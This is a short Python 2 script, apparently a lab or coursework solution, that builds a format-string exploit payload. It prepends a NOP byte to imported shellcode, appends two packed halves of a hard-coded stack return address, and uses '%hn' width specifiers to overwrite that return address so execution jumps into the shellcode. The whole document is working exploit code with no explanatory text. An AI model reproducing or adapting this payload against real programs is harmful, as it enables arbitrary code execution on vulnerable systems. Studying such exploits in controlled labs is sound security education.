from shellcode import shellcode
from struct import pack
# Shellcode address in buf
shellcode_addr = 0xbffec9b0
ret_addr = 0xbffed1bc

n = 0xbffe - 1 - 23 -4 -4
m = 0xc9b0 - 0xbffe

p = ''
p = "\x90"
p += shellcode
p += pack("<I", ret_addr + 2)
p += pack("<I", ret_addr)
p += '%' + str(n) + 'x' + '%10$hn'
p += '%' + str(m) + 'x' + '%11$hn'
print p
